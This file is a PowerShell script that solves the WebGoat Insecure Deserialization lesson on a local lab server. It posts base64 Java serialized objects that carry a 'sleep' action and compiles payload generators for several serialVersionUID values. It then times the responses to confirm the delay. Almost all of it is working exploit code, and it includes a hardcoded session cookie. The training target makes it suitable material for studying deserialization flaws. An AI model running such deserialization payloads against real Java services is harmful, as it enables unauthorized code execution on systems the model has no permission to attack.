# ============================================================
# Test Deserialization Payload with Different Versions
# ============================================================

$webGoatUrl = "http://192.168.254.112:8001"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Testing Deserialization Payloads" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

# The base payload with version 2L (from our Java program)
$payload_v2 = "rO0ABXNyABRWdWxuZXJhYmxlVGFza0hvbGRlcgAAAAAAAAACAgADSgAIdGFza1RpbWVMAAp0YXNrQWN0aW9udAASTGphdmEvbGFuZy9TdHJpbmc7TAAIdGFza05hbWVxAH4AAXhwAAAAAAAAE4h0AAVzbGVlcHQACURlbGF5VGFzaw=="

Write-Host "[TEST 1] Testing payload with serialVersionUID = 2L" -ForegroundColor Yellow
Write-Host "Payload: $payload_v2" -ForegroundColor Gray
Write-Host ""

$headers = @{
    "Content-Type" = "application/x-www-form-urlencoded"
    "Cookie" = "JSESSIONID=$sessionCookie"
}

$body = "token=$payload_v2"

try {
    $startTime = Get-Date
    
    $response = Invoke-WebRequest `
        -Uri "$webGoatUrl/WebGoat/InsecureDeserialization/task" `
        -Method POST `
        -Headers $headers `
        -Body $body `
        -UseBasicParsing
    
    $endTime = Get-Date
    $duration = ($endTime - $startTime).TotalSeconds
    
    Write-Host "Response received in $([math]::Round($duration, 2)) seconds" -ForegroundColor White
    
    $result = $response.Content | ConvertFrom-Json
    
    Write-Host ""
    Write-Host "Server Response:" -ForegroundColor Green
    Write-Host "  Feedback: $($result.feedback)" -ForegroundColor White
    Write-Host "  Lesson Completed: $($result.lessonCompleted)" -ForegroundColor White
    Write-Host "  Assignment: $($result.assignment)" -ForegroundColor White
    Write-Host ""
    
    if ($result.lessonCompleted -eq $true) {
        Write-Host "================================================" -ForegroundColor Green
        Write-Host "SUCCESS! Challenge completed!" -ForegroundColor Green
        Write-Host "================================================" -ForegroundColor Green
        exit 0
    }
    
    if ($result.feedback -match "does not match") {
        Write-Host "[INFO] Wrong serialVersionUID. Let's try other versions..." -ForegroundColor Yellow
    }
    
} catch {
    Write-Host "[ERROR] Request failed: $_" -ForegroundColor Red
    if ($_.Exception.Response) {
        Write-Host "Status Code: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Generating More Versions" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

# Let's try to brute force common version numbers
$versions = @(1, 2, 3, 4, 5, 10, 100, 1337, 2024, 2025)

Write-Host "We need to recompile with different serialVersionUID values." -ForegroundColor Yellow
Write-Host "Testing common version numbers: $($versions -join ', ')" -ForegroundColor Gray
Write-Host ""

foreach ($version in $versions) {
    Write-Host "[Generating] Version $version..." -ForegroundColor Yellow
    
    # Generate payload with this version
    $javaCode = @"
import java.io.*;
import java.util.Base64;

class VulnerableTaskHolder implements Serializable {
    private static final long serialVersionUID = ${version}L;
    private String taskAction;
    private String taskName;
    private long taskTime;
    
    public VulnerableTaskHolder(String action, String name, long time) {
        this.taskAction = action;
        this.taskName = name;
        this.taskTime = time;
    }
}

public class GenerateV${version} {
    public static void main(String[] args) {
        try {
            VulnerableTaskHolder task = new VulnerableTaskHolder("sleep", "DelayTask", 5000);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(task);
            oos.close();
            String payload = Base64.getEncoder().encodeToString(bos.toByteArray());
            System.out.println(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
"@
    
    # Write the Java file
    $javaCode | Out-File -FilePath "c:\webgoat-scripts-1\GenerateV${version}.java" -Encoding ASCII
    
    # Compile
    $compileResult = javac "c:\webgoat-scripts-1\GenerateV${version}.java" 2>&1
    
    if ($LASTEXITCODE -eq 0) {
        # Run and capture output
        $payload = java -cp "c:\webgoat-scripts-1" "GenerateV${version}" 2>&1
        
        if ($payload -match "^[A-Za-z0-9+/=]+$") {
            Write-Host "  Generated payload (first 50 chars): $($payload.Substring(0, [Math]::Min(50, $payload.Length)))..." -ForegroundColor Gray
            
            # Test this payload
            $body = "token=$payload"
            
            try {
                $startTime = Get-Date
                
                $response = Invoke-WebRequest `
                    -Uri "$webGoatUrl/WebGoat/InsecureDeserialization/task" `
                    -Method POST `
                    -Headers $headers `
                    -Body $body `
                    -UseBasicParsing
                
                $endTime = Get-Date
                $duration = ($endTime - $startTime).TotalSeconds
                
                $result = $response.Content | ConvertFrom-Json
                
                Write-Host "  Response time: $([math]::Round($duration, 2))s - $($result.feedback)" -ForegroundColor White
                
                if ($result.lessonCompleted -eq $true) {
                    Write-Host ""
                    Write-Host "================================================" -ForegroundColor Green
                    Write-Host "SUCCESS with version $version!" -ForegroundColor Green
                    Write-Host "Payload: $payload" -ForegroundColor Green
                    Write-Host "================================================" -ForegroundColor Green
                    exit 0
                }
                
                if ($duration -ge 4.5 -and $duration -le 5.5) {
                    Write-Host "  [GOOD] 5-second delay achieved!" -ForegroundColor Green
                }
                
            } catch {
                Write-Host "  [ERROR] Request failed" -ForegroundColor Red
            }
        }
    }
    
    Start-Sleep -Milliseconds 500
}

Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "If none worked, check the feedback" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "The feedback should tell us:" -ForegroundColor White
Write-Host "  - What actions are allowed" -ForegroundColor Gray
Write-Host "  - What the correct version might be" -ForegroundColor Gray
Write-Host "  - Any security restrictions" -ForegroundColor Gray
Write-Host ""
